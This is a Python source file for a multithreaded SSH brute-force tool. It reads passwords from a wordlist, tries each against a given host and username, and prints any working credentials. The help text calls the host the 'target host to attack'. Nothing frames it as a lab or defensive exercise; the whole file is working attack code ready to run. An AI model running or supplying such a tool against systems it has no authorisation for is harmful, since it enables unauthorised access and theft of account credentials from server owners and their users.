from socket import socket, AF_INET, SOCK_STREAM
from argparse import ArgumentParser, ArgumentTypeError
from ipaddress import IPv4Address
from datetime import datetime
from threading import Thread
from queue import Queue
from sys import exit

from ssh2.session import Session
from ssh2.exceptions import AuthenticationError, SocketRecvError, SocketDisconnectError

"""
Choice of SSH library (ssh2)
https://medium.com/the-elegant-network/a-tale-of-five-python-ssh-libraries-19cb8b72c914

SSH2-Python library docs
https://ssh2-python.readthedocs.io/en/latest/index.html
"""


# Credit: https://stackoverflow.com/a/71112312
def ranged_type(value_type, min_value, max_value):
    def range_checker(arg: str):
        try:
            value = value_type(arg)
        except ValueError:
            raise ArgumentTypeError(f'must be a valid {value_type}')
        if value < min_value or value > max_value:
            raise ArgumentTypeError(f'must be within [{min_value}, {max_value}]')
        return value

    return range_checker


def arguments():
    parser = ArgumentParser()
    parser.add_argument("-H", type=IPv4Address, metavar="HOST", required=True, help="target host to attack")
    parser.add_argument("-u", type=str, metavar="USERNAME", required=True, help="target username")
    parser.add_argument("-w", type=str, metavar="FILE", required=True, help="load passwords from file")
    parser.add_argument("-p", type=ranged_type(int, 1, 65535), metavar="PORT", default=22,
                        help="ssh service port (default: 22)")
    parser.add_argument("-t", type=ranged_type(int, 1, 64), metavar="TASKS", default=4,
                        help="number of concurrent tasks (default: 4)")

    args = parser.parse_args()
    return args


class BruteForcer:

    def __init__(self, host: str, port: int, username: str, tasks: int):
        self.host = host
        self.port = port
        self.username = username
        self.tasks = tasks
        self._queue = Queue()

        self.connect()

    def connect(self):
        try:
            # Create TCP socket using IPv4
            sock = socket(AF_INET, SOCK_STREAM)
            # Connect to the device with host and port
            sock.connect((self.host, self.port))

            return sock

        except Exception as e:
            # Catch any connection errors and exit
            exit(f"ERROR: {e}")

    def clear_queue(self):
        self._queue.mutex.acquire()
        self._queue.queue.clear()
        self._queue.all_tasks_done.notify_all()
        self._queue.unfinished_tasks = 0
        self._queue.mutex.release()

    def passwords_from_file(self, file: str):
        try:
            # Open file containing passwords in read mode
            with open(file, "r") as f:
                # Read each password in file
                for password in f.readlines():
                    # Add password to queue with newline removed
                    self._queue.put_nowait(password.strip("\n"))

        except FileNotFoundError:
            exit(f"ERROR: No such file was found: {file}")

    def add_single_password(self, password):
        return self._queue.put_nowait(password)

    def _worker(self):
        green = "\033[0;32m"
        reset = "\033[0m"

        while True:
            # Get password from queue
            password = self._queue.get()
            # Print authentication attempt
            print(f"{self.host} ~ {self.username}:{password}")

            # Try to authenticate and wait for response
            response = self.authenticate(self.username, password)
            if response:
                # If the response was positive, print valid credentials
                print(f"\nhost: {green}{self.host}:{self.port}{reset}  username: {green}{self.username}{reset}"
                      f"  password: {green}{password}{reset}")
                # Clear the queue of remaining passwords so threads can exit
                self.clear_queue()
            else:
                # If response was negative, mark task as done
                # and continue with next password attempt
                self._queue.task_done()

    def start(self):
        # Create and start x amount of threads to work concurrently
        [Thread(target=self._worker, daemon=True).start() for _ in range(self.tasks)]

        # Block until everything in the queue have been processed
        self._queue.join()

    def authenticate(self, username: str, password: str):
        while True:
            try:
                sock = self.connect()

                # Initialise SSH session
                session = Session()
                # Start SSH handshake
                session.handshake(sock)

                # Authenticate with username and password
                session.userauth_password(username, password)
                # If successful -> disconnect the session
                session.disconnect()
                # Return a positive authentication status
                return True

            except AuthenticationError:
                # Return a negative authentication status if unsuccessful
                return False

            except (SocketRecvError, SocketDisconnectError):
                # Catch any connection error and retry
                # until either successful or unsuccessful
                continue


def main():
    args = arguments()

    client = BruteForcer(args.H.exploded, args.p, args.u, args.t)
    client.passwords_from_file(args.w)
    print(f"Starting at {datetime.now().replace(microsecond=0)}\n")
    print(f"Attacking {args.H}:{args.p} (tasks {args.t})\n")

    client.start()
    print(f"\nFinished at {datetime.now().replace(microsecond=0)}")


if __name__ == "__main__":
    main()
